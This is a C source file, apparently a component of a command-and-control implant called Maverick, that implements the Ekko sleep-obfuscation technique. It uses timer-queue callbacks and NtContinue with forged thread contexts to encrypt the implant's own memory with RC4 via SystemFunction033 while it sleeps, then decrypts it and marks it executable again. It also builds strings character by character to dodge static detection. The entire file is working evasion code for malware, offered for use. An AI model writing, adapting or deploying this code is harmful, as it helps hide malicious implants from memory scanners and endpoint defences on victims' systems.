/*
 * Maverick — Ekko Obfuscation Module (PICO)
 * Fixes: cleanup CONTEXT-ów, losowy klucz, zamknięcie timer queue.
 */

#include <windows.h>

#define NtCurrentProcess()      ((HANDLE)(LONG_PTR)-1)

typedef struct {
        DWORD   Length;
        DWORD   MaximumLength;
        PVOID   Buffer;
} USTRING;

WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateTimerQueue(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$DeleteTimerQueue(HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$SetEvent(HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentThreadId(void);
WINBASEAPI void WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);

DECLSPEC_IMPORT void __cdecl MSVCRT$srand(unsigned int);
DECLSPEC_IMPORT int  __cdecl MSVCRT$rand(void);

WINBASEAPI VOID NTAPI NTDLL$RtlCaptureContext(PCONTEXT);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtContinue(PCONTEXT, BOOLEAN);

static void CopyContextRegisters(CONTEXT *dst, CONTEXT *src) {
        dst->ContextFlags = src->ContextFlags;
        dst->Rax = src->Rax;  dst->Rcx = src->Rcx;
        dst->Rdx = src->Rdx;  dst->Rbx = src->Rbx;
        dst->Rsp = src->Rsp;  dst->Rbp = src->Rbp;
        dst->Rsi = src->Rsi;  dst->Rdi = src->Rdi;
        dst->R8  = src->R8;   dst->R9  = src->R9;
        dst->R10 = src->R10;  dst->R11 = src->R11;
        dst->R12 = src->R12;  dst->R13 = src->R13;
        dst->R14 = src->R14;  dst->R15 = src->R15;
        dst->Rip = src->Rip;
}

static void EkkoObfuscation(char * start_addr, int size, int sleep_time) {
        HANDLE  hTimerQueue = NULL;
        HANDLE  hNewTimer   = NULL;
        HANDLE  hEvent      = NULL;
        PVOID   ImageBase   = NULL;
        DWORD   ImageSize   = 0;
        DWORD   OldProtect  = 0;
        DWORD   SleepTime   = 0;
        PVOID   NtContinue  = NTDLL$NtContinue;

        CONTEXT CtxThread = { 0 };
        CtxThread.ContextFlags = CONTEXT_ALL;

        CONTEXT *RopProtRW = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
        CONTEXT *RopMemEnc = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
        CONTEXT *RopDelay  = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
        CONTEXT *RopMemDec = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
        CONTEXT *RopProtRX = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
        CONTEXT *RopSetEvt = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);

        CHAR    KeyBuf[16];
        USTRING Key = { 0 };
        USTRING Img = { 0 };
        HMODULE hCryptsp = NULL;
        PVOID   pSysFunc033 = NULL;

        static char cryptsp[] = {'c','r','y','p','t','s','p','.','d','l','l',0};
        static char sf033[]   = {'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','3',0};

        if (!RopProtRW || !RopMemEnc || !RopDelay ||
            !RopMemDec || !RopProtRX || !RopSetEvt) {
                goto cleanup;
        }

        {
                FILETIME ft;
                KERNEL32$GetSystemTimeAsFileTime(&ft);
                MSVCRT$srand((unsigned int)(ft.dwLowDateTime) ^ KERNEL32$GetCurrentThreadId());
                for (int i = 0; i < 16; i++)
                        KeyBuf[i] = (CHAR)(MSVCRT$rand() & 0xFF);
        }

        hTimerQueue = KERNEL32$CreateTimerQueue();
        hEvent      = KERNEL32$CreateEventW(0, 0, 0, 0);
        if (!hTimerQueue || !hEvent) goto cleanup;

        ImageBase = start_addr;
        ImageSize = (DWORD)size;
        SleepTime = (DWORD)sleep_time;

        Key.Length = 16;
        Key.MaximumLength = 16;
        Key.Buffer = KeyBuf;

        Img.Length = ImageSize;
        Img.MaximumLength = ImageSize;
        Img.Buffer = ImageBase;

        hCryptsp = KERNEL32$LoadLibraryA(cryptsp);
        pSysFunc033 = (PVOID)KERNEL32$GetProcAddress(hCryptsp, sf033);
        if (!pSysFunc033) goto cleanup;

        if (KERNEL32$CreateTimerQueueTimer(
                &hNewTimer, hTimerQueue,
                (WAITORTIMERCALLBACK)NTDLL$RtlCaptureContext,
                &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
        {
                KERNEL32$WaitForSingleObject(hEvent, 0x32);
                if (CtxThread.Rip == 0) goto cleanup;

                CopyContextRegisters(RopProtRW, &CtxThread);
                CopyContextRegisters(RopMemEnc, &CtxThread);
                CopyContextRegisters(RopDelay,  &CtxThread);
                CopyContextRegisters(RopMemDec, &CtxThread);
                CopyContextRegisters(RopProtRX, &CtxThread);
                CopyContextRegisters(RopSetEvt, &CtxThread);

                RopProtRW->Rsp -= 8;
                RopProtRW->Rip  = (DWORD64)KERNEL32$VirtualProtect;
                RopProtRW->Rcx  = (DWORD64)ImageBase;
                RopProtRW->Rdx  = (DWORD64)ImageSize;
                RopProtRW->R8   = (DWORD64)PAGE_READWRITE;
                RopProtRW->R9   = (DWORD64)&OldProtect;

                RopMemEnc->Rsp -= 8;
                RopMemEnc->Rip  = (DWORD64)pSysFunc033;
                RopMemEnc->Rcx  = (DWORD64)&Img;
                RopMemEnc->Rdx  = (DWORD64)&Key;

                RopDelay->Rsp  -= 8;
                RopDelay->Rip   = (DWORD64)KERNEL32$WaitForSingleObject;
                RopDelay->Rcx   = (DWORD64)NtCurrentProcess();
                RopDelay->Rdx   = (DWORD64)SleepTime;

                RopMemDec->Rsp -= 8;
                RopMemDec->Rip  = (DWORD64)pSysFunc033;
                RopMemDec->Rcx  = (DWORD64)&Img;
                RopMemDec->Rdx  = (DWORD64)&Key;

                RopProtRX->Rsp -= 8;
                RopProtRX->Rip  = (DWORD64)KERNEL32$VirtualProtect;
                RopProtRX->Rcx  = (DWORD64)ImageBase;
                RopProtRX->Rdx  = (DWORD64)ImageSize;
                RopProtRX->R8   = (DWORD64)PAGE_EXECUTE_READWRITE;
                RopProtRX->R9   = (DWORD64)&OldProtect;

                RopSetEvt->Rsp -= 8;
                RopSetEvt->Rip  = (DWORD64)KERNEL32$SetEvent;
                RopSetEvt->Rcx  = (DWORD64)hEvent;

                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);
                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);

                KERNEL32$WaitForSingleObject(hEvent, INFINITE);
        }

cleanup:
        if (RopProtRW) KERNEL32$VirtualFree(RopProtRW, 0, MEM_RELEASE);
        if (RopMemEnc) KERNEL32$VirtualFree(RopMemEnc, 0, MEM_RELEASE);
        if (RopDelay)  KERNEL32$VirtualFree(RopDelay,  0, MEM_RELEASE);
        if (RopMemDec) KERNEL32$VirtualFree(RopMemDec, 0, MEM_RELEASE);
        if (RopProtRX) KERNEL32$VirtualFree(RopProtRX, 0, MEM_RELEASE);
        if (RopSetEvt) KERNEL32$VirtualFree(RopSetEvt, 0, MEM_RELEASE);
        if (hEvent)      KERNEL32$CloseHandle(hEvent);
        if (hTimerQueue) { KERNEL32$DeleteTimerQueue(hTimerQueue); KERNEL32$CloseHandle(hTimerQueue); }
}

void go(char * start_addr, int size, int time) {
        EkkoObfuscation(start_addr, size, time);
}
